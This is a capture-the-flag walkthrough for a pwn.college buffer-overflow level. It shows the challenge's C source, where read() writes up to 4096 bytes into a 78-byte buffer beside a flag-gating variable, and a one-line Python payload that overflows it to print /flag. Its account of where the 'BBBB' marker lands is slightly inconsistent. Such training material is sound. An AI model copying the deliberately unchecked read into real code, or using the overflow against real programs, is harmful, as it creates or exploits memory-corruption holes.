# Stage 02: Your First Overflow (Hard) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Hard |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-first-overflow` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-first-overflow`. The same first-overflow primitive at a larger offset: 98 bytes of `A` padding followed by the 4-byte `BBBB` marker.

## Source

The challenge ships its source at `/challenge/binary-exploitation-first-overflow.c`. You do not need to read C to follow the trick — the whole program reduces to four moves:

- **`win()`** is the only function that opens `/flag` and prints it. Nothing in the normal flow calls it.
- **`challenge()`** sets aside a 78-byte box named `input`, then a 4-byte box named `win_variable` immediately behind it.
- **`read(0, &data.input, 4096)`** pours up to 4096 bytes into that 78-byte box. Anything past byte 78 spills into `win_variable`.
- **`if (data.win_variable)`** asks whether the second box is non-zero. If it is, the program calls `win()`.

So the exploit is a controlled spill: fill the box, send four non-zero bytes into the next one, and the flag prints. The highlighted lines below are the ones that decide the challenge.

```c title="binary-exploitation-first-overflow.c" keys="63,64,72,80-82"
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

void bin_padding()
{
    asm volatile (".rept 427; nop; .endr");
}

void win()
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[78];
        int win_variable;
    } data  = {0} ;

    unsigned long size = 0;

    size = 4096;

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    if (data.win_variable)
    {
        win();
    }

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}
```

## Solution

```bash
python3 -c "print('A' * 98 + 'BBBB', end='')" | /challenge/binary-exploitation-first-overflow
```

The first 78 bytes fill `input`; the next bytes spill into `win_variable` at offset 80 (after 2 bytes of alignment padding), making it non-zero. The long `A` run is just a comfortable overshoot.
